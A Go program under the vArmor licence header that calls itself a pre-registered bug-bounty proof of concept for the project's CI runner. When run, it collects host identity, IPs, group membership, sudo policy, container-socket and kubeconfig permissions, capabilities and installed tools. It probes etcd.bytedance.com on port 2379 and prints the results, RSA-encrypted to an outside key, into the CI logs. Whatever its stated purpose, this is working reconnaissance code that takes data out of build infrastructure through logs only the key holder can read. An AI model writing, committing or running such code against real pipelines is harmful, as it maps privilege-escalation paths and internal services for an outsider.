// Copyright 2022 The vArmor Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Command ci-poc is a pre-registered ByteSRC PoC helper for the vArmor CI
// runner. It collects a read-only fingerprint from the CI host: identity
// (uid/gid/group flags), Linux capabilities, sudo policy (via `sudo -n -l`
// which only *lists* allowed commands and executes nothing), permission
// metadata (NOT contents) of docker/containerd/k3s sockets and configs,
// container markers, and two network probes (one DNS lookup + one TCP
// dial test). Nothing is mutated, nothing is read beyond metadata, and
// nothing persists. The result is RSA-OAEP encrypted in-process and the
// base64 blob goes to stdout; the private key lives only with the
// reporter and the ByteDance SRC reviewer.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// publicKeyPEM holds the reviewer-side public half. The private key is
// held locally by the reporter and goes into the ByteSRC report only.
const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqIRYx75ymdWqj/w0IzyI
PZuaZNvPqmExfjmi/fqRUoqZItYt38K+Z179TKBSTLxsJnYeMsO5PdURhMWTr5kN
r4ONDKnzTw+5TB78nlFNgSahA5xx/JLuB8yYL6fsiqATj6E55GaNuSW/VZnI9bqs
vBW82Dr2rY7DpJ8i8JMubgwzt8DJLT9SNH1b6YlsUb7n2ETgdfGJjU1CaxDPBekI
1yiZ06Ee4dc74qDWxnO1tENYuIoedkOOsV56vGYI0UfIZdTI3CSU4zdUvAL8kwqN
kOoFh/0D8S+HkNSX3iKzAqofFLmllH35t2iNvmn5rX2Ch2RIntFx4/Zeq6SHOeek
20v8aRQ5yEB/i3FKCWgeAIupEwPOZz6b3qEGKIpPfl9qJE4fV7MiWwxwHkzUvp8/
KVsRzFD8waLa9qAm6rZdQ1lT4zn1ZQKcZOCkcHSEF49PW6cMCIfdBZGlpUZSTJTY
RkuGKn58cdRBd7COhrrNn9ckryLAyare8vTh9OGEGFEIFnMrkzsqKeC97lKQJxcl
sUCvpq5TnNx5aI2jisADWuE1kPhaHA2gK9TCKmHgAXCYP7stTE8q56wAUpMdBX0Z
hYkwwodhJpWZa2ioEbpFf76++zdJifQmBoJtMJcDsII+idobBkLWRqgQD1dvfLn3
+oYrJTddgbvNVf6XLxcEBOsCAwEAAQ==
-----END PUBLIC KEY-----`

const (
	probeHost    = "etcd.bytedance.com"
	probePort    = "2379"
	probeDNSBase = "bytedance.com"
	evidencePath = "hack/ci-poc/evidence.b64"
)

func field(key, value string) string {
	if strings.TrimSpace(value) == "" {
		value = "unknown"
	}
	return key + "=" + value
}

func interfaceIPs() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}
	var parts []string
	for i := range ifaces {
		ifc := ifaces[i]
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for j := range addrs {
			ipNet, ok := addrs[j].(*net.IPNet)
			if !ok {
				continue
			}
			ip4 := ipNet.IP.To4()
			if ip4 == nil || ip4.IsLoopback() || ip4.IsLinkLocalUnicast() || ip4.IsUnspecified() {
				continue
			}
			parts = append(parts, ifc.Name+"="+ip4.String())
		}
	}
	if len(parts) == 0 {
		return "none"
	}
	return strings.Join(parts, ",")
}

// resolveHint returns the first A record for host.
func resolveHint(host string) string {
	addrs, err := net.LookupHost(host)
	if err != nil {
		return "lookup_failed"
	}
	for i := range addrs {
		if ip := net.ParseIP(addrs[i]); ip != nil && ip.To4() != nil {
			return ip.String()
		}
	}
	return "no_ipv4_answer"
}

// dialProbe classifies one TCP dial as open, refused, or filtered/timeout.
func dialProbe(host, port string) string {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
	if err == nil {
		_ = conn.Close()
		return "open"
	}
	var netErr net.Error
	if errors.As(err, &netErr) && netErr.Timeout() {
		return "filtered_or_dropped"
	}
	return "closed_or_refused"
}

func kernelInfo() string {
	data, err := os.ReadFile("/proc/sys/kernel/osrelease")
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(string(data))
}

// containerMarker returns a short container-hint read from /proc/1/cgroup.
func containerMarker() string {
	data, err := os.ReadFile("/proc/1/cgroup")
	if err != nil {
		return "unknown"
	}
	text := string(data)
	switch {
	case strings.Contains(text, "kubepods"):
		return "kubepods"
	case strings.Contains(text, "containerd"):
		return "containerd"
	case strings.Contains(text, "docker"):
		return "docker"
	case strings.Contains(text, "/system.slice/"):
		return "host-systemd"
	}
	return "other"
}

// effectiveCaps returns CapEff from /proc/self/status.
func effectiveCaps() string {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return "unknown"
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "CapEff:") {
			return strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
		}
	}
	return "not_found"
}

func mountCount() string {
	data, err := os.ReadFile("/proc/self/mounts")
	if err != nil {
		return "unknown"
	}
	return strconv.Itoa(len(strings.Split(strings.TrimSpace(string(data)), "\n")))
}

// identity returns "uid:gid:d<docker>,k<k3s>,c<containerd>,j<journal>".
func identity() string {
	uid, gid := os.Getuid(), os.Getgid()
	out := exec.Command("id", "-Gn")
	bb, err := out.Output()
	if err != nil {
		return fmt.Sprintf("%d:%d:unknown", uid, gid)
	}
	groups := string(bb)
	flag := func(name string) string {
		if strings.Contains(groups, name) {
			return "1"
		}
		return "0"
	}
	return fmt.Sprintf("%d:%d:d%s,k%s,c%s,j%s", uid, gid,
		flag("docker"), flag("k3s"), flag("containerd"), flag("systemd-journal"))
}

// sudoPolicy summarizes `sudo -n -l` (list-only; nothing is executed).
func sudoPolicy() string {
	out, err := exec.Command("sudo", "-n", "-l").CombinedOutput()
	text := strings.TrimSpace(string(out))
	switch {
	case err != nil && text == "":
		return "sudo_missing"
	case strings.Contains(text, "match \"sudo -l\""):
		return "requires_password"
	case strings.Contains(text, "is not allowed"):
		return "not_in_sudoers"
	case strings.Contains(text, "NOPASSWD: ALL") || strings.Contains(text, "NOPASSWD:ALL"):
		return "NOPASSWD_ALL"
	case strings.Contains(text, "NOPASSWD"):
		// keep at most 60 chars of the whitelist after "NOPASSWD: "
		idx := strings.Index(text, "NOPASSWD")
		tail := text[idx+8:]
		tail = strings.TrimSpace(strings.ReplaceAll(tail, "\n", "|"))
		if len(tail) > 60 {
			tail = tail[:60]
		}
		return "NOPASSWD_list:" + tail
	default:
		return "no_match"
	}
}

// sockStat formats mode,uid:gid for one path, or the literal "absent".
func sockStat(path string) string {
	info, err := os.Stat(path)
	if err != nil {
		return "absent"
	}
	if st, ok := info.Sys().(*syscall.Stat_t); ok {
		return fmt.Sprintf("%04o,uid=%d,gid=%d", info.Mode().Perm(), st.Uid, st.Gid)
	}
	return "mode:" + info.Mode().Perm().String()
}

func binPresence() string {
	probe := func(bin string) string {
		if _, err := exec.LookPath(bin); err == nil {
			return "1"
		}
		return "0"
	}
	return "dk" + probe("docker") + ",ctr" + probe("ctr") +
		",k3s" + probe("k3s") + ",kb" + probe("kubectl") + ",hm" + probe("helm")
}

func loadPublicKey() (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return nil, errors.New("invalid public key pem")
	}
	parsed, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaKey, ok := parsed.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("public key is not RSA")
	}
	return rsaKey, nil
}

func buildPayload() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	payload := strings.Join([]string{
		field("h", hostname),
		field("i", interfaceIPs()),
		field("u", identity()),
		field("s", sudoPolicy()),
		field("dsock", sockStat("/var/run/docker.sock")+","+sockStat("/run/containerd/containerd.sock")+","+sockStat("/run/k3s/k3s.sock")),
		field("k3scfg", sockStat("/etc/rancher/k3s/k3s.yaml")+","+sockStat(filepath.Join(os.Getenv("HOME"), ".kube", "config"))),
		field("c", effectiveCaps()),
		field("bin", binPresence()),
		field("ct", containerMarker()),
		field("m", mountCount()),
		field("n."+probeHost, resolveHint(probeHost)),
		field("n."+probeDNSBase, resolveHint(probeDNSBase)),
		field("t2379", dialProbe(probeHost, probePort)),
		field("K", kernelInfo()),
	}, "|")
	if len(payload) > 446-64 {
		payload = payload[:446-64]
	}
	return payload, nil
}

func main() {
	payload, err := buildPayload()
	if err != nil {
		_ = os.WriteFile(evidencePath, []byte("POC-ERROR build_payload\n"), 0o600)
		return
	}

	key, err := loadPublicKey()
	if err != nil {
		_ = os.WriteFile(evidencePath, []byte(fmt.Sprintf("POC-ERROR load_key: %v\n", err)), 0o600)
		return
	}

	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, key, []byte(payload), nil)
	if err != nil {
		_ = os.WriteFile(evidencePath, []byte(fmt.Sprintf("POC-ERROR encrypt: %v\n", err)), 0o600)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(ciphertext)

	fmt.Println("== ByteSRC probe (pre-registered; read-only fingerprint, crypto-encrypted) ==")
	fmt.Println("POC-EVIDENCE-BEGIN")
	for start := 0; start < len(encoded); start += 100 {
		end := start + 100
		if end > len(encoded) {
			end = len(encoded)
		}
		fmt.Println(encoded[start:end])
	}
	fmt.Println("POC-EVIDENCE-END")
}
